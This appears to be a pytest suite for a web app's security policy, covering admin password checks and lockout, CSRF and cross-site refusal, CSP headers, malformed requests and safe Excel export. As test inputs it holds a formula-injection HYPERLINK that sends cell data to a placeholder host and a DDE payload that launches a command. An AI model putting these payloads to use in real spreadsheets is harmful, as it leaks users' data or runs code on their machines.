"""Request policy: admin access, CSRF, response headers, malformed requests."""

from __future__ import annotations

import base64
import hashlib
import json
import re
import threading
import urllib.error
import urllib.request
from collections.abc import Iterator
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest

from vsa.config import Settings
from vsa.pipeline import Engine
from vsa.web.security import (
    MAX_FAILURES,
    AdminGuard,
    cross_site,
    is_admin_path,
    page_csp,
)
from vsa.web.server import STATIC, App, make_handler

LOCAL = {"Host": "127.0.0.1:8765"}


def basic(password: str, user: str = "admin") -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


class TestAdminGuard:
    def test_without_password_only_this_machine(self) -> None:
        g = AdminGuard()
        assert g.check("127.0.0.1", LOCAL).allowed
        assert g.check("::1", {"Host": "[::1]:8765"}).allowed
        assert g.check("10.1.2.3", LOCAL).status == 403  # another machine
        # through a reverse proxy on this machine: not "this machine"
        assert g.check("127.0.0.1", {**LOCAL, "X-Forwarded-For": "10.1.2.3"}).status == 403
        # DNS rebinding: a loopback connection asking for someone else's host name
        assert g.check("127.0.0.1", {"Host": "evil.example:8765"}).status == 403

    def test_password(self) -> None:
        g = AdminGuard("gizli-parola")
        assert g.check("10.1.2.3", {}).status == 401  # asks for it
        assert g.check("10.1.2.3", {"Authorization": basic("yanlis")}).status == 401
        assert g.check("10.1.2.3", {"Authorization": basic("gizli-parola")}).allowed
        assert g.check("10.1.2.3", {"Authorization": "Basic !!!"}).status == 401
        assert g.check("127.0.0.1", LOCAL).status == 401  # a password binds this machine too

    def test_lockout_after_wrong_passwords(self) -> None:
        g = AdminGuard("gizli-parola")
        for _ in range(MAX_FAILURES):
            g.check("10.9.9.9", {"Authorization": basic("yanlis")})
        assert g.check("10.9.9.9", {"Authorization": basic("gizli-parola")}).status == 429
        assert g.check("10.9.9.8", {"Authorization": basic("gizli-parola")}).allowed

    def test_from_env(self, tmp_path: Path) -> None:
        assert not AdminGuard.from_env({}).protected
        assert AdminGuard.from_env({"VSA_ADMIN_PASSWORD": "x"}).password == "x"
        secret = tmp_path / "parola"
        secret.write_text("dosyadan\n", encoding="utf-8")
        g = AdminGuard.from_env({"VSA_ADMIN_PASSWORD_FILE": str(secret)})
        assert g.password == "dosyadan"


def test_admin_paths() -> None:
    for p in ("/admin", "/admin/", "/api/admin/analyses", "/api/settings", "/api/reindex",
              "/api/llm", "/api/llm/save"):  # fmt: skip
        assert is_admin_path(p), p
    for p in ("/", "/api/ask", "/api/status", "/api/list", "/api/feedback", "/healthz"):
        assert not is_admin_path(p), p


def test_cross_site() -> None:
    assert not cross_site({})  # no browser headers: a script or a test client
    assert not cross_site({"Sec-Fetch-Site": "same-origin"})
    assert cross_site({"Sec-Fetch-Site": "cross-site"})
    assert cross_site({"Sec-Fetch-Site": "same-site"})  # a sibling host is another app
    assert not cross_site({"Origin": "http://vsa:8765", "Host": "vsa:8765"})
    assert cross_site({"Origin": "http://evil.example", "Host": "vsa:8765"})
    assert not cross_site({"Origin": "https://vsa.corp", "Host": "app:8765",
                           "X-Forwarded-Host": "vsa.corp"})  # fmt: skip
    assert cross_site({"Origin": "null"})


def test_page_csp_allows_only_the_page_script() -> None:
    html = (STATIC / "index.html").read_bytes()
    (script,) = re.findall(rb"<script>(.*?)</script>", html, re.S)
    digest = base64.b64encode(hashlib.sha256(script).digest()).decode()
    policy = page_csp(html)
    assert f"script-src 'sha256-{digest}';" in policy
    assert "'unsafe-eval'" not in policy and "frame-ancestors 'none'" in policy
    assert "'unsafe-inline'" not in policy and "style-src 'sha256-" in policy
    assert "script-src 'none'" in page_csp(b"<p>no script</p>")
    assert "style-src 'none'" in page_csp(b"<p>no style</p>")


def test_pages_set_no_style_attributes() -> None:
    """With no 'unsafe-inline' in the CSP a style attribute would be dropped: the pages set
    styles through CSSOM (``el.style``), never through markup or setAttribute."""
    for name in ("index.html", "admin.html"):
        html = (STATIC / name).read_text(encoding="utf-8")
        body = html[html.index("</style>"):]
        assert ' style="' not in body and 'setAttribute("style"' not in body, name


# --------------------------------------------------------------------------- over HTTP


@pytest.fixture
def server(sample_store_path: Path, tmp_path: Path) -> Iterator[str]:
    s = Settings()
    s.dictionary.store = str(sample_store_path)
    app = App(Engine.from_dictionary_file(s), tmp_path / "out", tmp_path / "feedback.jsonl",
              tmp_path / "settings.yaml")  # fmt: skip
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(app, AdminGuard("gizli")))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}"
    httpd.shutdown()
    httpd.server_close()


def call(
    url: str, data: bytes | None = None, headers: dict[str, str] | None = None
) -> tuple[int, dict[str, str], bytes]:
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def test_headers_on_pages_and_api(server: str) -> None:
    status, headers, _ = call(server + "/")
    assert status == 200
    assert "script-src 'sha256-" in headers["Content-Security-Policy"]
    assert headers["X-Frame-Options"] == "DENY" and headers["X-Content-Type-Options"] == "nosniff"
    assert headers["Server"] == "VSA"  # no version
    _, headers, _ = call(server + "/api/status")
    assert headers["Content-Security-Policy"].startswith("default-src 'none'")
    assert call(server + "/healthz")[0] == 200


def test_admin_needs_the_password(server: str) -> None:
    status, headers, body = call(server + "/admin")
    assert status == 401 and headers["WWW-Authenticate"].startswith("Basic")
    assert "parola" in json.loads(body)["error"]
    assert call(server + "/api/settings")[0] == 401
    assert call(server + "/api/llm/save", b"{}", {"Content-Type": "application/json"})[0] == 401
    status, headers, _ = call(server + "/admin", headers={"Authorization": basic("gizli")})
    assert status == 200 and "script-src 'sha256-" in headers["Content-Security-Policy"]
    assert call(server + "/api/settings", headers={"Authorization": basic("gizli")})[0] == 200


def test_cross_site_post_is_refused(server: str) -> None:
    body = json.dumps({"vote": "up", "query": "kart"}).encode()
    status, _, _ = call(server + "/api/feedback", body, {"Sec-Fetch-Site": "cross-site"})
    assert status == 403
    assert call(server + "/api/feedback", body, {"Sec-Fetch-Site": "same-origin"})[0] == 200


def test_malformed_requests(server: str) -> None:
    assert call(server + "/api/ask", b"[1, 2]")[0] == 400  # not a JSON object
    assert call(server + "/api/ask", b"{not json")[0] == 400
    status, _, body = call(server + "/api/ask", json.dumps({"query": "x" * 5000}).encode())
    assert status == 400 and "uzun" in json.loads(body)["error"]


def test_server_own_errors_carry_the_headers(server: str) -> None:
    req = urllib.request.Request(server + "/", method="DELETE")
    try:
        urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as e:
        assert e.code == 501 and e.headers["X-Frame-Options"] == "DENY"
        assert e.headers["Content-Type"].startswith("application/json")
    else:
        raise AssertionError("DELETE was accepted")


def test_report_never_writes_a_formula(tmp_path: Path) -> None:
    """A question or a model sentence starting with "=" stays text in Excel."""
    from openpyxl import load_workbook

    from vsa.models import AnalysisResult, Verdict
    from vsa.report.excel import write_ask_report

    evil = '=HYPERLINK("http://example.invalid/?x="&A1,"tıkla")'
    r = AnalysisResult(
        query=evil, verdict=Verdict.NOT_FOUND, summary="=1+1", objects=[], near_misses=[],
        notes=[], concepts=[], expansion_terms=[], dictionary_source="s.xlsx",
        dictionary_version="abc-1", generated_at="2026-10-07 12:00", method=[],
        interpretation="=cmd|' /C calc'!A0",
    )  # fmt: skip
    path = write_ask_report(r, tmp_path / "r.xlsx")
    cells = [c for ws in load_workbook(path).worksheets for row in ws.iter_rows() for c in row]
    texts = {c.value for c in cells if isinstance(c.value, str)}
    assert {evil, "=1+1"} <= texts  # written, as text
    assert all(c.data_type != "f" for c in cells)
